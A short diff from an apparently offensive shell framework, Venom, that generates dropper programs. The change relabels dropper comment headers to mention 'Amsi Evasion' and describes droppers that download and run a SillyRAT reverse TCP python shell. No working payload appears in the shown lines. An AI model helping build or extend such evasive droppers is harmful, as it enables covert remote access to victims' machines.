@@ -10332,7 +10332,7 @@ if [ "$SOSP" = "Windows" ]; then
       ## Build dropper.vbs (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
       echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
       echo "' Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.vbs
-      echo "' Framework: Venom v1.0.17 - Multi-OS - Agent nº5" >> $Drop.vbs
+      echo "' Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.vbs
       echo "' Function: Install python3 SillyRAT requirements before downloading" >> $Drop.vbs
       echo "' and executing $Drop.py (Client reverse tcp python shell) in background." >> $Drop.vbs
       echo "' ---" >> $Drop.vbs
@@ -10375,7 +10375,11 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "" >> $Drop.c
       echo "/*" >> $Drop.c
       echo "Author: r00t-3xp10it [SSA RedTeam @2020]" >> $Drop.c
-      echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.c
+      if [ "$vbsevasion" = "ON" ]; then
+         echo "Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.c
+      else
+         echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.c
+      fi
       echo "Function: Install python3 SillyRAT requirements before downloading and executing" >> $Drop.c
       echo "$Drop.py (Client reverse tcp python shell) detach from parent (dropper) process." >> $Drop.c
       echo "Mandatory dependencies: python3 and pip3 {tabulate pynput psutil pillow pyscreenshot pyinstaller}" >> $Drop.c
